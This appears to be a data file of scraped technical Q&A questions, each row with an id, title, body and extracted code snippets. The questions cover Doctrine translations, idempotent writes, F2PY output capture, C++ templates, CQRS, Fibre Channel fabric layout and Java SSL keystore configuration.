Problem with Translatable I installed Translatable from doctrine extensions as suggested but didnt work as i want and experienced users adviced me against using it. Even when having a seperate table it has the translatable columns in both main table and translations table and stores the values in an eav way. Also in case default locale changes (that happened to me and may happen again) it makes things complicated as default values at main table dont seem to have a specified locale.Also i have several translatable fields (5~).That would result in 5 or even more left joins in case of fallback. Other Solution The other solution i thought is having a separate table with translations only for each table and set the default locale and fallback maybe via a postLoad event listener.This way i could call obj.getTitle() without obj.translations['en'].getTitle() ,no need to provide locale. The problem The problem with this approach is the fallback.One workaround is during join to add a ""WITH locale in ('en','de') for example.This would return lots more data but fallback would work. The other way would be using coalesce but it is impossible for doctrine to map it at entity. Is there any way to implement fallback effiently ?",[],False

2530428,How to make write operation idempotent?,"I'm reading an article about the recently released Gizzard sharding framework by twitter (http://engineering.twitter.com/2010/04/introducing-gizzard-framework-for.html). It mentions that all write operations must be idempotent to ensure high reliability. According to wikipedia, ""Idempotent operations are operations that can be applied multiple times without changing the result."" But, IMHO, in the Gizzard case, idempotent write operations should be ones in which sequence doesn't matter. Now, my question is: How to do I make write operations idempotent? The only thing I can imagine is to have a version number attached to each write. For example, in a blog system, each blog must have a $blog_id and $content. At the application level, we always write blog content like this write($blog_id, $content, $version). The $version is determined to be unique at the application level. So, if an application first tries to set one blog to ""Hello world"" and second want's it to be ""Goodbye"", then write is idempotent. We have such two write operations: These two operations are supposed to changed two different records in the DB. So, no matter how many times and what sequence these two operations are executed, the results are the same. This is just my understanding. Please correct me if I'm wrong.","['write($blog_id, ""Hello world"", 1);\nwrite($blog_id, ""Goodbye"", 2);\n']",False

Redirecting FORTRAN (called via F2PY) output in Python However, I would also like to optionally have the fortran code write to the terminal as well as recording it. Is this possible? I have the following silly class which I cobbled together from the question above and also from http://websrv.cs.umt.edu/isis/index.php/F2py_example. My code currently looks something like this: My idea is to have a flag called silent that I could use to check whether I allow the fortran output to be displayed or not. This would then be passed to the captureTTY when I construct it, i.e. I am not really sure how to go about implementing this. The obvious thing to do is: I am not a big fan of this, as my fortran method takes a long time to run, and it would be nice to see it updated in real time and not just at the end. Any ideas? The code will be run on Linux &amp; Mac machines, not windows. I've had a look around the web, but haven't found the solution. If there is one, I am sure it will be painfully obvious!

However, this prevents it from printing to the screen. I can have it print to the screen, but then cannot record it. I want to have the option to do both simultaneously, i.e. record the output and have it print to the screen in real time. Just as an aside, the fortran code is a fitting algorithm and the actual output that I am interested is the parameters for each iteration.","[""class captureTTY:\n    ''' \n    Class to capture the terminal content.

2721846,"C++ SFINAE with CRTP, G++ compile error","I would like to know if the following code are valid. The original intension is that, I like a base class that dispatch calls to a certain member to either derived class members if it is there or fall back to default behaviors if derived class does not have this member. Another use is that this base class can be used by itself and the template parameter becomes a implementation policy. Anyway, the following MWE compiles and runs correctly with , Intel, and MSVS. However it fails with (from 4.4 to 4.6, any version I had a hand on) with the error message at the end of the question. If I change the at point (1), (2), (3) to (which was the sort of thing I did originally), does not complain anymore. I don't think it is a good practice to have the dispatch function and the caller having the same name. I was just curious if it will work, and curiously enough to try it out (I have no idea how does this idea come to me). My rationale behind this is that, at pint (1), is invoked with one parameter, so the overload resolution will not match its caller, the zero parameter one. It will not match the one at point (2) either, since does not have the member, and then it shall match the one at point (3). Just as in the situation when (1)-(3) are named . But does not agree with me and other compilers. So, is it an incorrect implementation of or the code itself is invalid? Besides the error message is really confusing. Where does the and come from? Int he called the member pointer was defined as 's member. Error: Edit Though I have not fully understand what goes wrong in the above code yet. But I think there is a another way without specifically construct a SFINAE class but archive the same effect. Basically, because and both are derived from , so the expression will always be resolved. In it resolved to , then the template version member is used. In , it does not have its own , so is resolved to , and thanks to @DavidRodríguez-dribeas, who points out that now has the type , therefore the template and the non-template members equally match, but non-template is preferred. So the default call is used.

The first PC (PC1) runs a program that controls and monitors an alarm system. The seconds PC (PC2) is any PC that is connected to the internet and must be able to also control and monitor the alarm system. A Java program runs on PC1 and this program monitors and controls the alarm. I therefore have to find a way to control this program remotely. I do not want to use remote desktop as I need to limit the amount of data transfer. I just want to be able to send/receive commands to/from PC1. The program on PC2 can either be a stand alone program or a web app. I'm not sure what would be the best/easiest option to implement. Any comments would be appreciated. So far, I have come up with the following options: PC1 acts as a server and opens a socket for the PC2. PC2 connects to the sockets and starts to send commands and then receives responses. I think firewalls and IP addresses can be be a problem Create a server program that runs on a server on the internet somewhere. PC1 and PC2 would then be clients that communicate with each other via the server. I think this is the best solution, but I have no idea how to implement this. Use Google App Engine as the server and somehow relay information between the two PCs. I've done a lot of research, bit still I don't know what is the best way to implement this. I am planning on writing the programs in Java. I have good programming experience, but my knowledge regarding networks are very limited. I would also have the add a password to log in and ideally encrypt the transmitted information. Any comments regarding the above options or any other method to solve my problem would be greatly appreciated. Thanks",[],False

2755008,Can a Windows 8 machine safely run without an anti-virus?,"One of the new features of Windows 8 is the UEFI ""Secure Boot"", ""which uses a public-key infrastructure to verify the integrity of the operating system and prevent unauthorized programs such as bootkits from infecting the device"". According to this Wikipedia reference: The UEFI 2.2 specification adds a protocol known as Secure boot, which can secure the boot process by preventing the loading of drivers or OS loaders that are not signed with an acceptable digital signature. When secure boot is enabled, it is initially placed in ""Setup"" mode, which allows a public key known as the ""Platform key"" (PK) to be written to the firmware. Once the key is written, secure boot enters ""User"" mode, where only drivers and loaders signed with the platform key can be loaded by the firmware. Additional ""Key Exchange Keys"" (KEK) can be added to a database stored in memory to allow other certificates to be used, but they must still have a connection to the private portion of the Platform key. Secure boot can also be placed in ""Custom"" mode, where additional public keys can be added to the system that do not match the private key. Probably 99% of known viruses (if not 100%) take advantage of some boot driver or boot process to transfer itself to system memory. Assuming that I'm running a Windows 8 with Secure Boot on my UEFI system, could I feel safe to use my system without an anti-virus or even with a antivirus that open itself on Windows bootloader? PS: Please explain if I completelly misunderstood the meaning of ""Secure Boot"" or UEFI features.",[],False

There doesn't seem to be a sched_setaffinity equivalent available for modules. Is there any way to force this module to run on all cores, either through parallelization or iterating across all cores?

I was thinking that it might be able to boot a live Linux USB from a live Linux CD because it also does not have a DVD drive and I wish to install via the DVD version. So using a live Linux disc and using the GRUB loader – or whatever you call the first screen that asks you what you want to do – there normally is a custom option where you can write your own boot code. If this is possible – and I have no idea if it is – what would be the boot command for the USB? I do realize that I would need to find out the generic name for the USB before I started. If you are wondering: It's an eMachine, about 10-15 years old, has 512MB of RAM (which I upgraded from 256) and I believe a Pentium 3 or 4 processor. Yes I realize there are other ways to do this, like using the 13 disc set, but I really rather not wait to download ALL of those discs as I already have the iso for the DVD version that I already tested and it has the options I want. I'm installing openSUSE, but that's not important as I want the answer for future reference. Also, I would like to know how to find the generic name for the USB when plugged in — I have no idea where to find that without the BIOS.",[],False

I'm trying to implement a way for the votes on your links to count towards a total 'karma' score, ala reddit. Your karma would be your positive votes less your negative votes in total. I'm thinking I need to write a method in the User model (perhaps link model?) Right now there is no field in the users table for 'karma' or 'link_score' or anything like that. Maybe adding a simple integer column to the Link table and adding or subtracting to it when it's voted on would allow me to do this? Right now to display the number of votes i'm using link.votes.count which may not be correct (maybe it shows total votes and not total as Up - Down). Github Link",[],False

My question is - how do I specify the format I want to use? Changing the query, for example like this, is possible, but less desired since I have a few places in the code that query for the data and I do not wish to change each of them, I would like the definition to be system-wide. Thanks for your help. EDIT: I wanted to add a clarification: When I wrote this, I was thinking of the direction of editing the mapping file. I thought that there might be a way to define the format there. That would mean changing in one place only, and not relying on any default format.

One of the paragraph says as below. Unless there are negative effects on the user experience or it's otherwise impractical, we intend to turn on HTTPS by default more broadly, hopefully for all Gmail users. We're also considering how to make this work best for other apps including Google Docs and Google Calendar (we offer free HTTPS for those apps as well). I didn't understand what negative effects can there be, by shifting over to HTTPS. Is there a benchmarking done on the peformance of HTTP and HTTPS. I feel that https actually involves some additional protocol messages initially and data encryption later on. Can't these issues be taken care by having SSL browser code to be loaded by default etc..

To solve the problem, I have tried this change: 0 5 * * * /bin/nice -n 19 /usr/local/bin/backup.php but it doesn't seem to improve the situation. How is that possible?

3020265,Help with a recursion algorithm,"Ok, this may seem trivial to some, but I'm stuck. Here's the algoritm I'm supposed to use: Here’s a recursive algorithm. Suppose we have n integers in a non-increasing sequence, of which the first is the number k. Subtract one from each of the first k numbers after the first. (If there are fewer than k such number, the sequence is not graphical.) If necessary, sort the resulting sequence of n-1 numbers (ignoring the first one) into a non-increasing sequence. The original sequence is graphical if and only if the second one is. For the stopping conditions, note that a sequence of all zeroes is graphical, and a sequence containing a negative number is not. (The proof of this is not difficult, but we won’t deal with it here.) Example: Original sequence: 5, 4, 3, 3, 2, 1, 1 Subtract 1 five times: 3, 2, 2, 1, 0, 1 Sort: 3, 2, 2, 1, 1, 0 Subtract 1 three times: 1, 1, 0, 1, 0 Sort: 1, 1, 1, 0, 0 Subtract 1 once: 0, 1, 0, 0 Sort: 1, 0, 0, 0 Subtract 1 once: -1, 0, 0 We have a negative number, so the original sequence is not graphical. This seems simple enough to me, but when I try to execute the algorithm I get stuck.

3021846,Using sudo inside a script,"Is it considered good or bad practice to use the sudo command inside a shell script? One advantage is that if the user runs the script as non-root, she or he will be asked for password on demand rather than the script failing. On the other hand, if the user has recently run a command with sudo, the script will implicitly run commands as root which may not be what the user expects.

3027148,Django and Python handle changing date format,Im importing records from a CSV file into a django model. The CSV file is uploaded by the user. The problem I'm facing is with the date field. The date field expects the date to be in but different spreadsheet programs default to different types of formats and I dont want the user to have to change their default format. So I want to find the best method for django to accept dates that could possibly be in various formats. What I thought could work is to specify a list of allowed date formats and try and match the string to one of them... thanks,['YYYY-MM-DD'],True

3048797,"How to use network fileshare as user's home, and not roaming profiles","Some of my users are very frustrated, because their login/logout times are reaching into the minute ranges. We have a few shift workers using the same machine, and invariably, the second shift has to sit around for literally 5-10 minutes while the previous user logs out, and the new user can log in. There is high network traffic at this time, so I assume its copying the user's profile back to the server and vice versa. This time wait goes away if I disable roaming profiles for the user, but then their stuff isn't being backed up because we don't back up each machine. To solve this, I figured I'd just use a network share instead of a roaming profile. Simple right? In this question: http://serverfault.com/questions/2748/auto-mapping-network-drive-when-a-user-logs-in, it looks like I found a solution, but no dice. Probably because I'm using Windows 7 on the desktop and Windows Server 2008 as the AD server. Here's the case: a) In AD, under the ""profile"" tab for the user, I've set the profile to load from a network share (e.g. \\nfs\profiles\david) b) Also in the ""profile"" tab, I've set the ""Home Folder"" to ""Connect:"", and mapped drive H: to \\nfs\homes\david c) I log in to the desktop, and drive H: is correctly mapped, but the user's home folder (and thus desktop, documents, etc.) is still stored on the local machine and copied with every login/logout.

3059805,VCS Labelling in TeamCity while overriding a template,"We use TeamCity and Subversion for build management. For each project, we have multiple build configurations, one for each environment we will deploy to (e.g. Dev, Test, Staging). It makes sense, I think, to use a TeamCity Template to keep these configurations in sync, overriding the differences with parameters and variables (e.g. overriding NAnt targets). The problem is that I cannot override the VCS Labelling configurations (the options are greyed out in the build configuration attached to a template). Ideally I'd like only the builds going to Test and Staging to be tagged, not the Dev builds. Is there a way I can achieve this, or am I going to have to abandon the Template idea and have multiple build configurations?",[],False
3060634,(C++) Passing a pointer to dynamically allocated array to a function,"I've had problems with variables overwriting each other in memory, so I decided I'd try to allocate one of my arrays dynamically. In the simplified code below, I'm attempting to create an array of integers using dynamic allocation, then have a function edit the values within that array of integers. Once the function has finished executing, I'd like to have a nicely processed array for use in other functions. From what I know, an array cannot be passed to a function, so I'm simply passing a pointer to the array to the function. When I attempt to compile the code above, g++ gives me the following warning: When I run the compiled a.out executable anyway, it outputs nothing, leaving me with nothing but the message in terminal. What am I doing wrong? My code not attempting to access or write to anything outside of the array I created. In fact, I'm not even attempting to read or writing to the last element of the array!

Can anyone offer any advice as to why this would be happening? I am currently adding objects to the scrollV using the following function: I have added the code just incase any of this is interfering with the scrollV for some reason.

3091823,Wordpress custom taxonomy slug and terms relations conflict,"I know you heard this about 100 times before however I can't find an answer to my question. My problem differs from others as this is not an error yet however I want to prevent it in the best Way possible. I'm creating a mobile webapp and using Wordpress as the CMS. The web app is an events based app. I have a problem where I have three location / states or towns. Each state or town is its own custom taxonomy. However in each state or town I have the exact same terms. The issues is I've read so Much on this I'm confused as to what I should be doing. From what I've noticed is that users complaining about the error of conflicting terms and slugs are generally people that already made the mistake of naming their terms the same and saving. They don't bother to change the slug. My question is if I created all my terms the same name but created the slugs completely different like so. Town 1 (custom taxonomy) Fast food ( term) fast-food-town-1 (slug) And created Town 2 (custom taxonomy) Fast food (term) fast-food-town-2 (slug) Would these two terms conflict at all. As I've seen others have an issue where they change the one term and all terms in other taxonomies change as well. Or their slug gets a number added after it. If this method would be fine to use please let me know. If not please explain an alternative to this method with same results. On the same topic, another question is if I do a query of the taxonomy then the term, would there be a conflict as there are two terms names the same but in different taxonomies. Would the taxonomy-taxonomy-term.php filter all the terms of the same name from every taxonomy? I don't want that to happen. I want the term from a specific taxonomy only. I've tested this on a test server and it worked fine. However I'm scared to test it on a live site without first finding out from the pros how to tackle this. Any help would be greatly appreciated. If I have added this to the wrong forum please direct me to the right threads as I'm still new here and finding my way around. Best regards",[],False

3270191,Help me solve this bug with my ray tracer,"I'm not going to post any code for this question because it would require way too much context, but I shall explain conceptually what I'm doing. I'm building a simple ray tracer that uses affine transformations. What I mean is that I'm intersecting all rays from camera coordinates with generic shapes. The shapes all have associated affine transformations, and the rays are first multiplied by the inverses of these transformations before intersecting with scene objects. So for example, say I wanted a sphere of radius 3 positioned at (10,10,10). I create the sphere and give it a transformation matrix representing this transformation. I create a ray in camera coordinates. I multiply the ray by the inverse of the sphere's transformation matrix and intersect it with the generic sphere (r=1 at (0,0,0)). I take the distance along this generic ray at the intersection point and using it I find the generic normal and the point along the original ray and save these into a Transformation object (along with the distance (t) and the actual transformation). When it comes time to figure out the colour of this intersection point I take the transformation's inverse transpose and multiply it by the generic normal to find the normal. The point of intersection is just the point along the original non-transformed ray if I use the t value from the intersection of the inverse transformed ray. The problem is, when I do things this way the transformations have weird effects. The main effect is that transformations seem to drag lights from the scene along with them. If I build a bunch of images and apply a slightly larger rotation to the sphere with each frame, it seems to drag the lights in the scene around with it. Here's an example I honestly cannot figure out what I'm doing wrong here, but I'm tearing my hair out. I can't think of any good reason whatsoever for this to be happening.

EDIT: My IE solution works because when the user hits the back button the iframe is sent back but the parent page remains at the same spot.

3286094,CQRS with Repository pattern and Inversion of Control (with DI),"I assigned a POC project to someone where I asked to implement both Command Query Responsibility Segregation, Inversion of Control (with Dependency Injection) and Repository pattern. “Someone” gave me a POC solution project but I am not sure whether this is the way it is done. I will brief here about the POC project The project is a simple 3-tier application – the Presentation Layer (PL), the Business Logic Layer (BLL) and the Data Access Layer (DAL); each tier being a separate project The Presentation Layer is a Web Application, the BLL and DAL are class library projects In the Business Layer, there are defined Repository Interfaces. The reference of BLL library is added to DAL project and inside the DAL project there are concrete classes that implement the Repository Interfaces. This is how Inversion of Control is applied Since Command-Query-Responsibility-Segregation is done, the repository interfaces in the Business Layer only declare Add/Update and Delete methods. For read, there are “Read” interfaces directly in the DAL and in the DAL there are concrete classes that implement these interfaces. The Presentation Layer contains reference to both the BLL library and the DAL library. Calls to Add/Update/Delete are routed through the BLL to the DAL while any read is done directly from the DAL. I believe this conforms to Command-Query-Responsibility-Segregation concept of bypassing the BLL for doing reads. Here is an illustration of how this is all setup. There are three projects NW.Web NW.Business NW.DataAccess Below is a snapshot of code in the different layers. -- NW.Web -- // A class in the Presentation Layer public class CustomerPage { // Business layer Interface from NW.Business namespace private ICustomerBusiness ICustB; //DAL Read interface from NW.DataAccess.Read namepsace private ICustomerRead&lt;Guid&gt; ICustR; //Constructor for the Customer Page that uses Constructor Injection public CustomerPage(ICustomerBusiness ICustB, ICustomerRead&lt;Guid&gt; ICustR) { this.ICustB = ICustB; this.ICustR = ICustR; } } -- NW.Business -- //Declaration of business interface in the Business Layer interface ICustomerBusiness { void Persist(); } // A class in the Business Layer that implements the business interface public class Customer: ICustomerBusiness { //Repository interface object that will be injected by Constructor Injection. private ICustomerRepository ICustRep; public Customer(ICustomerRepository ICustRep) { this.ICustRep = ICustRep; } public void Persist() { ICustRep.AddOrUpdate(); } } //Declaration of Repository interface in the Business Layer public interface ICustomerRepository { void AddOrUpdate(); void Delete(); } -- NW.DataAccess-- public class CustomerRepository : ICustomerRepository { public void AddOrUpdate() { //implementation of Add or Update } public void Delete() { //implementation of Delete } } //A Read interface in the Data Access Layer interface ICustomerRead&lt;T&gt; { // A read is returned as DTO since in Database this may map to more than 1 table CustomerDTO GetCustomerDetails(T id); } // An implementation of the Read Interface in the Data Access Layer namespace NW.DataAccess.Read { public class CustomerRead&lt;T&gt; : ICustomerRead&lt;T&gt; { public CustomerDTO GetCustomerDetails(T id) { //implementation here } } } My gut feeling is that there is something wrong here. It seems CQRS or at least the above implementation does not address some requirements The Customer Business object (Customer class) may need to read from Database for its internal purpose (like initializing variables etc). With read directly defined in DAL layer, the only way to do this would be to reference the DAL dll in the BLL. But this would create circular reference and go against the IOC that is done What happens when there is some common Read requirement across all business objects ?",[],False

3405745,Is this version of the Hanoi towers problem NP-complete?,"This was really inspired by Solitaire, but a few people reacted with ``oh, it's like the towers of Hanoi, isn't it?'' so I'll try to pose the problem in terms of discs here. Let's start. There are n disks on the real line, one of size 1 at position $x_1$, one of size 2 at position $x_2$, ..., and one of size n at position $x_n$. Your goal is to make a tower with all n discs, consuming as little energy as possible in the process. You are allowed to move a tower whose base is a disk of size k only on top of the disk with size k+1 (which may be the top of another mini-tower). The energy you consume to perform such a move is the distance traveled by the moved mini-tower. For example, the energy consumed by the first move is $|x_k-x_{k+1}|$. Now, you'd like to write a program that tells you whether the energy you have is enough to perform the task. It just needs to say Y or N. (If the answer is Y, then clearly the list of moves is proof enough that the answer is correct, so the problem is NP. If the answer is N, there's no point in even attempting the task---you are too tired.) What's the fastest such program you can find? Is the problem NP-complete? If it helps, consider a simplifications that restrict $x_k$'s to be rational, integers, integers in a certain range, etc. Here's an upper bound: $O(n2^n)$. Represent the initial state by the list $x_1$, $x_2$ ,... ,$x_n$. A move affects the state by deleting a number in this list and the energy consumed by the move is the absolute difference between the deleted number and the number coming after. Clearly there are $2^n$ states with at most $n$ moves each. (See my blog post for an example run of this algorithm if it's not clear. The description there is in terms of cards.)

If i remove the class '.resize', which resisez the images to fit in page, it looks crappy but it works fine. The problem only occurs with big images though.

3555643,Correct placement of devices on a Fibre Channel fabric,"We're getting a pair of new 8Gb switches for our fibre channel fabric. This is a Good Thing since we're running out of ports in our primary datacenter, and it'll allow us to have at least one 8Gb ISL running between our two datacenters. Our two datacenters are about 3.2km apart as the fibre runs. We've been getting solid 4Gb service for a couple of years now, and I have high hopes it can sustain 8Gb as well. I'm currently figuring out how to reconfigure our fabric to accept these new switches. Due to cost decisions a couple of years ago we are not running a fully separate double-loop fabric. The cost of full redundancy was seen as more expensive than the unlikely downtime of a switch failure. That decision was made before my time, and since then things haven't improved much. I would like to take this opportunity to make our fabric more resilient in the face of a switch failure (or FabricOS upgrade). Here is a diagram of what I'm thinking for a lay-out. Blue items are new, red items are existing links that will be (re)moved. The red arrowed line is the current ISL switch link, both ISLs are coming from the same switch. The EVA6100 is currently connected to both of the 16/4 switches that have an ISL. The new switches will allow us to have two switches in the remote DC some one of the long-range ISLs are moving to the new switch. The advantage to this is that each switch is no more than 2 hops from another switch, and the two EVA4400's, which will be in an EVA-replication relationship, are 1 hop from each other. The EVA6100 in the chart is an older device that will eventually be replaced, probably with yet another EVA4400. The bottom half of the chart is where most of our servers are, and I'm having some concerns about exact placement. What needs to go in there: 10 VMWare ESX4.1 hosts Accesses resources on the EVA6100 4 Windows Server 2008 servers in a one fail-over cluster (file-server cluster) Accesses resources on both the EVA6100 and the remote EVA4400 2 Windows Server 2008 servers in a second fail-over cluster (Blackboard content) Accesses resources on the EVA6100 2 MS-SQL database servers Accesses resources on the EVA6100, with nightly DB exports going to the EVA4400 1 LTO4 tape library with 2 LTO4 tape drives. Each drive gets its own fibre port. The backup servers (not in this list) spool to them At the moment the ESX cluster can tolerate up to 3, maybe 4, hosts going down before we have to start shutting VMs down for space. Happily, everything has MPIO turned on. The current 4Gb ISL links haven't come close to saturation that I've noticed. That may change with the two EVA4400's replicating, but at least one of the ISLs will be 8Gb. Looking at the performance I'm getting out of EVA4400-A I am very certain that even with replication traffic we will have a hard time crossing the 4Gb line. The 4-node file-serving cluster can have two nodes on SAN1SW4 and two on SAN1SW1, as that'll put both storage arrays one hop away. The 10 ESX nodes I'm somewhat head-scratchy over. Three on SAN1SW4, three on SAN1SW2, and four on SAN1SW1 is an option, and I'd be very interested to hear other opinions on layout. Most of these do have dual-port FC cards, so I can double-run a few nodes. Not all of them, but enough to allow a single switch to fail without killing everything. The two MS-SQL boxes need to go on SAN1SW3 and SAN1SW2, as they need to be close to their primary storage and db-export performance is less important. The LTO4 drives are currently on SW2 and 2 hops from their main streamer, so I already know how that works. Those can remain on SW2 and SW3. I'd prefer not to make the bottom half of the chart a fully-connected topology as that would reduce our usable port-count from 66 to 62, and SAN1SW1 would be 25% ISLs. But if that's strongly recommended I can go that route. Update: Some performance numbers that will probably be useful. I had them, I just spaced that they're useful for this kind of problem. EVA4400-A in the above chart does the following: During the work-day: I/O ops average under 1000 with spikes to 4500 during file-server cluster ShadowCopy snapshots (lasts about 15-30 seconds). MB/s generally stays in the 10-30MB range, with spikes up to 70MB and 200MB during ShadowCopies. During the night (backups) is when it really pedals fast: I/O ops average around 1500, with spikes up to 5500 during DB backups. MB/s varies a lot, but runs about 100MB for several hours, and pumps an impressive 300MB/s for about 15 minutes during the SQL export process. EVA6100 is a lot more busy, since it is the home to the ESX cluster, MSSQL, and an entire Exchange 2007 environment. During the day I/O ops average about 2000 with frequent spikes up to around 5000 (more database processes), and MB/s averaging between 20-50MB/s. Peak MB/s happens during ShadowCopy snapshots on the file-serving cluster (~240MB/s) and lasts for less than a minute. During the night the Exchange Online Defrag that runs from 1am to 5am pumps I/O Ops to the line at 7800 (close to flank speed for random access with this number of spindles) and 70MB/s. I would appreciate any suggestions you may have.",[],False

3604316,CAKeyframeAnimation flip animation slow first time,"I'm doing a series of back-to-back animations using CAKeyframeAnimation. Currently, for each series, I create the CAKeyframeAnimation for a subsequent series when the previous one completes. This basically works except for nagging problem with timing. The issue is I have another concurrent animation I'm doing with an NSTimer and the keyframe animations need to be in sync with that. The problem is the keyframe animations are a bit slower the first time I play them. On subsequent times played, the timing is good on the latest hardware. On older hardware there are timing issues regardless. Since the animation is based on a series of png images, I initially thought it had to do with caching, but after pre-caching images, it seems that isn't the only problem (It appears that keyframe animation has other prep work it does prior to playing) At this point I'm wondering if using a keyframe animation is the way to go. I haven't worked with CAAnimationGroup, but it does look like it might solve this problem. I could probably also solve it by using NSTimer instead of keyframe animations. I'm looking for some input as I'd rather not start down the wrong path at this point.",[],False

3669413,"ASP.NET MVC 3 - enabled unobtrusive javascript, ajaxComplete fires once and never again","Before unobtrusive javascript, I handled ajax complete events with the following register: This event handler will fire every time an ajax request is complete. I also have an ajaxComplete event bind in $(document).ready(), to handle ajax calls exclusively through jQuery: Which also works great. But I get a different behavior when I enabled unobstrusive javascript in ASP.NET MVC 3. It fires the first time when the first ajax call is complete, but on subsequent ajax requests, ajaxComplete event never fires again. Now, I know about that you need to call $.validate.unobtrusive.parse() to rebuild the validation after the elements in the form updated via partial postback. Is there something similar that I need to do to make sure that ajaxComplete can fire again on subsequent requests? I cannot find the documentation on this. FYI: I have included all the jquery*.js libs to support unobtrusive javascript. I also have the MicrosoftMvc*.js libs included to support legacy code in the project. I was hoping to convert everything over until I ran into this problem.","['Sys.Net.WebRequestManager.add_completedRequest(myHandler);\n', '$.ajaxComplete(function (e, xhr, settings) {\n    myHandler(xhr)\n});\n']",False

3704888,Enum declaration inside a scope that is a parameter of a macro,"I am trying to create a macro that takes a scope as a parameter. I know, it is probably not a good thing etc etc. I was trying this and got the problem that preprocessor looks for commas and parentheses... the problem is with enum. How would I declare a enum inside a scope that is a parameter of a macro? when the compiler see the comma between enum itens, it takes it as a separator. If you are curious to know why I entered into this, is because I need to register my namespaces and classes, for namespaces I need to know when they are closed, so I was thinking to create a macro that initially calls a static function that register the namespace, encapsulate its contents and finally call a static function that removes the namespace from the registry. With a macro it would be easier for the coder to do this and make sure he doesn't forget to remove the namespace in the end of the bracket. Thanks, Joe EDIT: I want a macro that accepts a scope as parameters: now, if I try: it won't compile because of the comma inside the enum, because the compiler thinks it is a separator of the macro. It doesn't happen with commas inside parentheses, example: would compile normally because the comma is inside a double parentheses.

3705002,Windows Server 2008 R2 Standard Connect to Wireless Network Before Login,"I'm a developer and I've installed Windows Server 2008 R2 on a box at home. I've set up a user and can connect to my home wireless router. I'm using the box to setup some version control and continuous integration. So I'll only need it on when I'm doing some developing. It won't be running nightly builds, only when I check code in. I don't have a spare monitor or keyboard so I want to remote in to the server whenever I need to do anything on it. The problem is this: The server doesn't connect to the network until someone has logged in. How do I set up the wireless so that when the machine is turned on? It connects to the wireless network so I can remote in and use the other services. The only work around I have is not setting any password so the user logs in automatically. Then I can remote in no problem. This is less than ideal. I'm not a server admin, so forgive me if there is a simple solution that I haven't found via Google. EDIT I'm not sure I made myself clear. The server needs to connect to a home wireless network with a key. This only happens once a user is logged on. Ineed it to happen when the pc is turned on and no user is logged in yet.

UPDATE: Thanks to answers from @kotarak and @jayunit100 and comments from @sw1nn and @marko-topolnik, I have at least two variations that work: I'm coming from an imperative background, and my goal with this question is to understand the thread macro in an attempt to write more idiomatic Clojure (before experimenting with the thread macro, I was looping over each sequence using multiple and s). From the comments, it appears that the thread macro may not be the most idiomatic way to do this, but I still would like to see how to make it work so I can fill this gap in understanding. Also, returns a sequence of four items, and if you do a instead of , you can see it prints the count of four sequences rather than one continuous sequence: How would you modify the above to print one continuous stream of words instead of printing the contents of four sequences?

I am especially interested in figuring out the shmid so i can use it in calls to shmctl(). On Solaris i would just read /proc/$PID/map to figure out that information (field pr_shmid). The contents of that file are defined by struct prmap_t in sys/procfs. AIX also has a /proc/$PID/map file. There is also a struct prmap but unfortunately it is missing the pr_shmid field. Any ideas how i can achieve this on AIX5.3+?,[],False
3803192,Using two private keys (keystore) and two public keys (truststore) in one SSL Socket Connection,"I need to use to key-pair in one socket ssl connection without change nothing in clients. Why? Because one client use a CN attribute in trust store for connection handshake and other clients using another value in the same attribute to process the same task in the same way. So I need to use two key store (private) with distinct CN attributes and also aliases and share two different trust store (public key) with distinct CN attributes and also aliases too. Describing bellow: keyStore1 Keystore type: JKS Keystore provider: SUN Alias name: identity1 Owner: CN=app1 ... Issuer: CN=app1 ... trustStore1 Alias name: identity1 Owner: CN=app1 ... Issuer: CN=app1 ... keyStore2 Alias name: identity2 Owner: CN=app2 ... Issuer: CN=app2 ... trustStore2 Alias name: identity2 Owner: CN=app2 ... Issuer: CN=app2 ... I tried to implement this feature in this way: ... But I received this error message ... java.security.KeyStoreException: Uninitialized keystore at java.security.KeyStore.aliases(KeyStore.java:941) at com.sun.net.ssl.internal.ssl.SunX509KeyManagerImpl.(SunX509KeyManagerImpl.java:106) at com.sun.net.ssl.internal.ssl.KeyManagerFactoryImpl$SunX509.engineInit(KeyManagerFactoryImpl.java:41) at javax.net.ssl.KeyManagerFactory.init(KeyManagerFactory.java:192) ... So I really want to know if is possible to use to key-pairs in one socket connection or solve this in a different way that I can't see or deal with. EDIT 1 Bruno, could you give me an entire or complete example please? Because is not clear for me.... I tried two things: One solutions is put the two keys inside a private keystore following a previous suggestion... but doesn't work and I received the message bellow: Exception in thread ""main"" java.lang.NoSuchMethodError: javax.net.ssl.SSLContext.setDefault(Ljavax/net/ssl/SSLContext;) at ...initialiseManager(499) You was right ... I still need to choose one context or javax.net.ssl.SSLException: No available certificate or key corresponds to the SSL cipher suites which are enabled. while trying send a message to the server... Second I followed your suggestion...but SSL Socket connection doesn't start I implemented this with help of many other guys that showed their code here in this site...thanks for all *2012.02.09 18:47:00 Activating an SSL connection 2012.02.09 18:47:00 [... ::run] 2012.02.09 18:47:00 Trust File Loaded publicKey 2012.02.09 18:47:00 Trust File Loaded publicKeyTwo 2012.02.09 18:47:00 Loaded keystore privateKey privateKey 2012.02.09 18:47:00 Loaded keystore privateKey2 privateKeyTwo 2012.02.09 18:47:00 Number of key managers registered:1* But nothing happened when I tried to send a message for the server... Is being hard to find an example that really works in this case. EDIT 2 Hi Bruno Really you have advanced knowledge about this subject, java and ssh and I appreciate your help. All this information is help me understand better this issue while is showing for me the way... Thx a lot And again you are right...I'm using code for Java 6 on a Java 5 JRE But following again your recipe I got this code : Is exactly this I need to achieve my objective? EDIT 3 Using this approach a got a handshake between client and server using the second keystore with alias2 using public trust store2 in client ...but I still got error when I tried to use trust store1 in client ...received a message from [addr=/11.111.111.11] Reverting to JVM Server alias : alias2 Reverting to JVM Key : alias2 Error in retriving: javax.net.ssl.SSLHandshakeException: Received fatal alert: certificate_unknown My code not change the server to use the private key1 with alias1 ... when the client is using the public truststore1 with cert alias1... What more is necessary to do for solve this...I believe is near the final solution... thx again! EDIT 4 Bruno , I changed the getCertificateChain method by following your suggestion showed bellow and the method also I removed the duplicated method... And in the addiction the clients that use the old trust store don't verify the hostname But for the client that need to use the second trust store do this verification and it's a reason because I need to deal with to key-pair certificates... EDIT5 I'd like to know how I can implement a server socket to let it able to identify and use correct certificate according with the certificate being used by client to proceed handshake communication with the server. Explaining better, in the server side is: AppServerSideSocket.jar private keystore: privateKeyApp (type JKS, generated with keytool) public keystore : publicKeyApp (type JKS, shared with all clients) And in the client side ... AppClientSideSocket.jar - public keystore : publicKeyApp The AppServerSideSocket.jar listening clients requests and once received process information sent by clients The AppClientSideSocket.jar connect with the server using SSL using publicKeyApp without verify server hostname and after handshake send information for the AppServerSideSocket application. Now I've another client application, 